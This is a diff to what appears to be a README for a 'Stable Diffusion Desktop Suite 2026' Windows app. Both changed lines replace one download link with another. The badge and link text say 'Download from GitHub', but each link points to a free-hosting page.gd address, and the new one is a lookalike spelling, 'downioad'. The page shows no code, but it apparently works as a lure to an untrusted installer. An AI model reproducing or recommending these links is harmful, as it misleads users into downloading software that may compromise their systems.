@@ -2,7 +2,7 @@
 
 The Stable Diffusion Desktop Suite 2026 provides a comprehensive Windows solution for harnessing powerful AI image generation capabilities entirely on your local machine. This integrated package combines the core Stable Diffusion functionality with an intuitive graphical interface, making advanced AI art creation accessible without requiring command-line expertise.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -81,6 +81,6 @@ The suite is designed to be lightweight yet powerful, offering a balanced approa
 
 *Last Updated: October 2026 | Version 2.5.1*
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *This software is provided as-is. Users are responsible for ensuring compliance with all applicable terms and conditions. The developers assume no liability for any issues arising from use of this application.*
